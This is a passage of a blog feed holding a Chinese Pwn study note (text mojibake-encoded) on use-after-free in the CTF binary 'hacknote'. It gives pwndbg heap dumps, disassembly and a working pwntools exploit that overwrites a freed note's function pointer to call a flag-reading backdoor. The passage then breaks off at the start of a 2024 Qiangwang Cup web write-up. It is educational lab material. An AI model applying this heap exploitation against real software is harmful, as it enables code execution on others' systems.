class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r</span></span><br><span class="line">Starting program: /mnt/c/Users/20820/Downloads/hacknote</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Note size :20</span><br><span class="line">Content :aaa</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Note size :30</span><br><span class="line">Content :AAA</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :^C</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åæŸ¥çœ‹ä¸‹ heap çŠ¶æ€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure><p>â€‹é™¤å¼€æœ€å¼€å§‹çš„é‚£ä¸ª size ä¸º 0x190 çš„é‚£ä½ä»¥å¤–ï¼Œå…¶ä»–çš„å¤§è‡´ç¬¦åˆæƒ…å†µ ï¼Œä¸¤æ¬¡éƒ½æ˜¯å…ˆç”³è¯·äº†ä¸€ä¸ªå †å—å­˜æ”¾ä¸¤ä¸ªåœ°å€ï¼Œç„¶åç”³è¯·å¦ä¸€ä¸ªå †å—æ¥å­˜æ”¾è¾“å…¥çš„å†…å®¹ï¼Œä¹‹åè¯»ä¸€ä¸‹ 0x804b198 çš„å†…å­˜ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0804b1b00804865b&lt;---è¿™é‡Œä¸¤ä¸ªæ•°æ®ï¼Œä¸€ä¸ªæ˜¯å‡½æ•°æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯0x0804865bï¼Œå¦ä¸€ä¸ªå°±æ˜¯è¾“å…¥åœ°å€çš„é‚£ä¸ªå †å—çš„åœ°å€0x0804b1b0</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x000000000a616161</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1e00804865b</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x000000000a414141</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå‡½æ•°åœ¨ IDA é‡Œçš„åœ°å€æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0804865B print_note_content proc near            ; DATA XREF: add_note+9Aâ†“o</span><br><span class="line">.text:0804865B</span><br><span class="line">.text:0804865B arg_0           = dword ptr  8</span><br><span class="line">.text:0804865B</span><br><span class="line">.text:0804865B ; __unwind &#123;</span><br><span class="line">.text:0804865B                 push    ebp</span><br><span class="line">.text:0804865C                 mov     ebp, esp</span><br><span class="line">.text:0804865E                 sub     esp, 8</span><br><span class="line">.text:08048661                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:08048664                 mov     eax, [eax+4]</span><br><span class="line">.text:08048667                 sub     esp, 0Ch</span><br><span class="line">.text:0804866A                 push    eax             ; s</span><br><span class="line">.text:0804866B                 call    _puts</span><br><span class="line">.text:08048670                 add     esp, 10h</span><br><span class="line">.text:08048673                 nop</span><br><span class="line">.text:08048674                 leave</span><br><span class="line">.text:08048675                 retn</span><br><span class="line">.text:08048675 ; &#125; // starts at 804865B</span><br><span class="line">.text:08048675 print_note_content endp</span><br></pre></td></tr></table></figure><p>â€‹æ­¤æ—¶ bins é‡Œå•¥éƒ½æ²¡æœ‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åï¼Œæˆ‘ä»¬åˆ†åˆ«é‡Šæ”¾æ‰ä¸¤ä¸ªå †ï¼Œå‘ç° heap å˜äº†ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x804b1a0</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure><p>â€‹é‡Šæ”¾æ‰äº†ä¹‹åï¼Œè¯»å– 0x804b198 çš„å†…å®¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0804b01000000000</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x0804b01000000000</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b0100804b1a0</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x0804b01000000000</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å†çœ‹çœ‹è¿™ä¸ªï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">tcachebins</span><br><span class="line">0x10 [  2]: 0x804b1d0 â€”â–¸ 0x804b1a0 â—‚â€” 0</span><br><span class="line">0x20 [  1]: 0x804b1b0 â—‚â€” 0</span><br><span class="line">0x30 [  1]: 0x804b1e0 â—‚â€” 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>â€‹å®Œè›‹ï¼Œæ²¡æ³¨æ„åˆ° tcache ç»™æˆ‘ä¿å­˜äº†è¿™äº›å†…å®¹ï¼Œä¸è¿‡ä¸æ¸…æ¥šæ˜¯å¦å­˜åœ¨å½±å“ï¼Œç»§ç»­è°ƒä¸€è°ƒçœ‹çœ‹å§ï¼Œä¹‹åé‡æ–°ç”³è¯·ä¸ªå †</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span></span><br><span class="line">Continuing.</span><br><span class="line">1</span><br><span class="line">Note size :8</span><br><span class="line">Content :aaaa</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :^C</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå†çœ‹çœ‹ heapï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure><p>â€‹0x804b198 è¿™ä¸ªåœ°å€çš„ chunk è¢«é‡æ–°æ‹¿å»ç”¨äº†ï¼Œç¬¬äºŒæ¬¡ç”³è¯·çš„é‚£ä¸ªåŸæœ¬å­˜æ”¾äº†å‡½æ•°æŒ‡é’ˆå’Œå­—ç¬¦ä¸²æŒ‡é’ˆçš„é‚£ä¸ª chunk è¢«åˆ†é…äº†ï¼Œä¹‹å‰æ‹¿å»ä½œä¸ºå­˜æ”¾å†…å®¹çš„é‚£ä¸¤ä¸ª chunk ä¸€ä¸ªéƒ½æ²¡æœ‰è¢«åˆ†é…ï¼Œä¹‹åè¯»ä¸€ä¸‹è¿™ä¸ªåœ°å€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30xg 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0000000a61616161</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x0804b01000000000</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1a00804865b</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x0804b01000000000</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°è¿™é‡Œè¢«è¾“å…¥çš„å­—ç¬¦ç»™å äº†ï¼Œå†å»è¯»ä¸€ä¸‹è¿™ä¸ª 0x804b1c8ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30xg 0x804b1c8</span></span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1a00804865b</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæ²¡æœ‰å•¥å˜åŒ–ï¼Œä¾æ—§æ˜¯æŒ‡å‘è¾“å‡ºå‡½æ•°çš„åœ°å€ï¼Œä»¥åŠæŒ‡å‘æŸå­—ç¬¦ä¸²çš„åœ°å€ï¼Œ0x804b198 è¿™ä¸ªåœ°å€çš„ chunk ä¹‹å‰ç¼–å·ä¸º 0ï¼Œå› ä¸ºåœ°å€æ›´ä½ï¼Œæ›´å…ˆè¢«åˆ†é…ï¼Œè¿™ä¸ªåœ°å€æ›´é«˜çš„ä½œä¸ºç¼–å· 1ï¼ŒåŒæ—¶æ•´ä¸ªç¨‹åºå­˜åœ¨ backdoorï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/hacknote/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹æ‰€ä»¥åªéœ€è¦é€šè¿‡ä¸¤æ¬¡é‡Šæ”¾ä¹‹åï¼Œå†ç”³è¯·ä¸€ä¸ª 0x8 ä¹‹ç±»æ¯”è¾ƒå°çš„ï¼Œä¿è¯èƒ½å¤Ÿå†™å…¥åœ°å€åŒæ—¶èƒ½å¤Ÿè®©åˆ†é…åˆ°çš„ chunk ä¸ºåŒä¸€ä¸ªå³å¯ï¼Œç„¶åç”³è¯·çš„æ—¶å€™å‘é€çš„æ•°æ®ä¸ºåé—¨å‡½æ•°çš„åœ°å€å³å¯ï¼Œä¹‹åè¾“å‡ºçš„æ—¶å€™å®ƒä¼šè‡ªåŠ¨è°ƒç”¨åé—¨ç¨‹åºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">20</span>, <span class="string">&quot;note1&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">30</span>, <span class="string">&quot;note2&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#[*] Switching to interactive mode</span></span><br><span class="line"><span class="comment">#flag&#123;asd32as1-1d8g1r1hj5g4d4-9d54h3jyur4nfke1a&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwnå­¦ä¹ ç¬”è®°10uaf&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwnå­¦ä¹ ç¬”è®°10uaf&quot;&gt;#&lt;/a&gt; Pwn å­¦ä¹ ç¬”è®°ï¼ˆ10ï¼‰â€“UAFï¼š&lt;/h1&gt;
&lt;p&gt;â€‹		UAF å°±æ˜¯ Use-After-Freeï¼Œå³ä¸€ä¸ªæŒ‡å‘å †å—çš„æŒ‡é’ˆè¢«</summary>
      
    
    
    
    <category term="Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…»" scheme="http://blog.g01den.top/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="http://blog.g01den.top/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>ã€2024ã€‘å¼ºç½‘æ¯</title>
    <link href="http://blog.g01den.top/posts/666fe8df.html"/>
    <id>http://blog.g01den.top/posts/666fe8df.html</id>
    <published>2024-11-03T11:28:49.000Z</published>
    <updated>2024-11-03T11:32:14.159Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> webï¼š</h1><h2 id="pyblockly"><a class="markdownIt-Anchor" href="#pyblockly">#</a> PyBlocklyï¼š</h2><p>â€‹ç½‘ç«™æ˜¯ä¸€ä¸ªé€šè¿‡ block çš„å †ç§¯æœ¨çš„å½¢å¼ç¼–ç¨‹ï¼Œæœ‰ä¸¤ç§æ•°æ®ç±»å‹ä»¥åŠå››ç§å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯æ­£å¸¸è¿ç®—ï¼Œprint è¾“å‡ºï¼Œmin å’Œ max åŠŸèƒ½ï¼Œéšä¾¿å†™ä¸€äº›ä»£ç ï¼Œå‘ç°ç»“æœä¼šå›æ˜¾å‡ºæ¥ã€‚</p><p>â€‹å†æ¥çœ‹çœ‹æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span 